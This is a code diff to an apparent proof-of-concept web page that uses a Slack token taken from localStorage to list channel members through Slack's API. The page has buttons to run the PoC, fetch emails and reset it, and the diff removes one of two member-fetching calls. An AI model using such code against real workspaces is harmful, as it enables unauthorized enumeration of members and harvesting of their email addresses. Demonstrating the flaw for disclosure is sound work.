@@ -18,6 +18,7 @@
     
         <button type="button" class="btn btn-success" onclick="getObject();">Run PoC</button>
         <button type="button" class="btn btn-danger" onclick="fetchEmails();">Fetch Emails</button>
+        <button type="button" class="btn btn-info" onclick="localStorage.clear();">Reset PoC</button>
                    
         <h3><br />Preview:-</h3><hr />
         <pre class="preview"></pre>
@@ -68,13 +69,6 @@ function createNewConversation(members){
 
 function startPoC() {
     var token = localStorage.getItem("token");
-    fetch("https://slack.com/api/conversations.members?&channel=C010MKS02CF&token="+token).then(
-        response => response.json()).then((json) => {
-            localStorage.setItem("memberscount", json["members"].length)
-            document.getElementsByClassName("preview")[0].innerHTML = "[+] Fetching member ids from #general<br />";
-            createNewConversation(json["members"])
-        })
-
     fetch("https://slack.com/api/conversations.members?&channel=CUQNLNEN4&token="+token).then(
         response => response.json()).then((json) => {
             localStorage.setItem("memberscount", json["members"].length)
